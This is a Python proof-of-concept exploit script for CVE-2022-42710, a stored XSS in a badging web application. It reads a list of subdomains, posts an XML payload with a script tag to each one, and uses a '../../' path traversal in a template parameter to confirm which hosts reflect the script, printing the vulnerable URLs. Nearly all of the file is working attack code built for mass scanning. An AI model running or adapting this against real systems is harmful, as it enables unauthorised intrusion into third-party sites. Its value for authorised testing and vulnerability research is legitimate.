import re
import argparse
import requests


class bcolors:
    OKGREEN = '\033[92m'
    FAIL = '\033[91m'
    BOLD = '\033[1m'


def logo():
    print(bcolors.OKGREEN+'''
 ██████ ██    ██ ███████       ██████   ██████  ██████  ██████        ██   ██ ██████  ███████  ██  ██████  
██      ██    ██ ██                 ██ ██  ████      ██      ██       ██   ██      ██      ██ ███ ██  ████ 
██      ██    ██ █████   █████  █████  ██ ██ ██  █████   █████  █████ ███████  █████      ██   ██ ██ ██ ██ 
██       ██  ██  ██            ██      ████  ██ ██      ██                 ██ ██         ██    ██ ████  ██ 
 ██████   ████   ███████       ███████  ██████  ███████ ███████            ██ ███████    ██    ██  ██████  
                                                                                                           
'''+bcolors.BOLD+'''                                                                                                          
    Author: Omar Hashem
    Twitter: @omarhashem666                                                                                                                                                                                      
    ''')


parser = argparse.ArgumentParser(logo(), usage=bcolors.OKGREEN +"\npython3 CVE-2022–42710.py -f subdomains-file.txt \n")
parser.add_argument('-f', help='<file contain subdomains>')
args = parser.parse_args()


def exploit_func(sub_domain):
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}
	payload = "<xml><orientations><orientation>L</orientation><background><![CDATA['><script>alert(document.domain);</script><img alt=\"Image not exist\" src='x]]></background></orientations></xml>"
	first_req = requests.post(sub_domain+"/badging/person_funct.php", data=payload, headers=headers, verify=False)
	regex_to_extract_payload_img_name = re.search("user_img/\d(.*)\.jpg",first_req.text)
	try:
		payload_path = "../../" + regex_to_extract_payload_img_name[0]
		second_req = requests.get(sub_domain+"/badging/badge_template_print.php?idt=1&tpl="+payload_path, verify=False)
		if "'><script>alert(document.domain);</script><img alt=\"Image not exist\" src='x" in second_req.text:
			print("\n\nVulnerable: "+ sub_domain +"/badging/badge_template_print.php?idt=1&tpl="+payload_path+"\n\n")
	except:
		pass


if __name__ == '__main__':
	if args.f is not None:
		file_contain_subs = open(args.f).readlines()
		sub_domains = set()
		for sub in file_contain_subs:
			sub_domains.add(sub.strip())

		try:
			sub_domains.remove("")
		except:
			pass

		print(bcolors.FAIL + "If there are vulnerable applications it will be printed here:\n")
		for sub_domain in sub_domains:
			exploit_func(sub_domain)
	else:
		parser.print_help()
